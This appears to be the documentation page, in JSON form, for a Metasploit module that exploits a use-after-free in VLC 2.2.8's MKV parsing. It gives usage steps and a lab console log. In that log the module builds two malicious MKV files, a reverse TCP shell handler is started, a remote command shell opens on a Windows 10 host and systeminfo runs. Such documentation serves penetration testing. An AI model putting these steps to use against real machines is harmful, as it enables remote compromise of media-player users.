{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/fileformat/vlc_mkv","result":{"data":{"moduleMetadataJson":{"id":"5c54b823-8547-567a-b7d7-5ee7d3695eed","name":"VLC Media Player MKV Use After Free","fullname":"exploit/windows/fileformat/vlc_mkv","description":"This module exploits a use after free vulnerability in\n        VideoLAN VLC =< 2.2.8. The vulnerability exists in the parsing of\n        MKV files and affects both 32 bits and 64 bits.\n\n          In order to exploit this, this module will generate two files:\n        The first .mkv file contains the main vulnerability and heap spray,\n        the second .mkv file is required in order to take the vulnerable code\n        path and should be placed under the same directory as the .mkv file.\n\n          This module has been tested against VLC v2.2.8. Tested with payloads\n        windows/exec, windows/x64/exec, windows/shell/reverse_tcp,\n        windows/x64/shell/reverse_tcp. Meterpreter payloads if used can\n        cause the application to crash instead.","rank":500,"fields":{"detailsSlug":"/modules/details/exploit/windows/fileformat/vlc_mkv","documentationSlug":"/modules/documentation/exploit/windows/fileformat/vlc_mkv","referencesSlug":"/modules/references/exploit/windows/fileformat/vlc_mkv"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>VideoLAN VLC &#x3C;= v2.2.8 (32 and 64 bit) are vulnerable to a use-after-free vulnerability that exists in the parsing of MKV files.</p>\n<p>This module has been tested against 32 and 64 bit versions of VLC v2.2.8 on Windows 10 Pro x64.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p><a href=\"https://get.videolan.org/vlc/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">VLC</a> &#x3C;= v2.2.8</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ul>\n<li><code class=\"language-text\">./msfconsole -q</code></li>\n<li><code class=\"language-text\">use exploit/windows/fileformat/vlc_mkv</code></li>\n<li><code class=\"language-text\">run</code></li>\n<li>Start handler</li>\n<li>Copy over mkv files to target hosts and open part1 in VLC</li>\n<li>Set a shell</li>\n</ul>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"windows-10-x64-running-vlc-228-x64\" style=\"position:relative;\"><a href=\"#windows-10-x64-running-vlc-228-x64\" aria-label=\"windows 10 x64 running vlc 228 x64 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows 10 x64 running VLC 2.2.8 (x64)</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/windows/fileformat/vlc_mkv\nmsf5 exploit(windows/fileformat/vlc_mkv) &gt; set lhost 172.22.222.134 \nlhost =&gt; 172.22.222.134\nmsf5 exploit(windows/fileformat/vlc_mkv) &gt; run\n\n[+] tjub-part1.mkv stored at /home/msfdev/.msf4/local/tjub-part1.mkv\n[*] Created tjub-part1.mkv. Target should open this file\n[+] tjub-part2.mkv stored at /home/msfdev/.msf4/local/tjub-part2.mkv\n[*] Created tjub-part2.mkv. Put this file in the same directory as tjub-part1.mkv\n[*] Appending blocks to tjub-part1.mkv\n[+] Succesfully appended blocks to tjub-part1.mkv\nmsf5 exploit(windows/fileformat/vlc_mkv) &gt; handler -p windows/x64/shell/reverse_tcp -H 172.22.222.134 -P 4444\n[*] Payload handler running as background job 0.\nmsf5 exploit(windows/fileformat/vlc_mkv) &gt; \n[*] Started reverse TCP handler on 172.22.222.134:4444 \n[*] Sending stage (336 bytes) to 172.22.222.200\n[*] Command shell session 2 opened (172.22.222.134:4444 -&gt; 172.22.222.200:49731) at 2018-10-10 12:08:58 -0500\nsessions -i 2\n[*] Starting interaction with 2...\n\nsysteminfo\nsysteminfo\n\nHost Name:                 DESKTOP-IPOGIJR\nOS Name:                   Microsoft Windows 10 Pro\nOS Version:                10.0.17134 N/A Build 17134</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"5c54b823-8547-567a-b7d7-5ee7d3695eed"}}}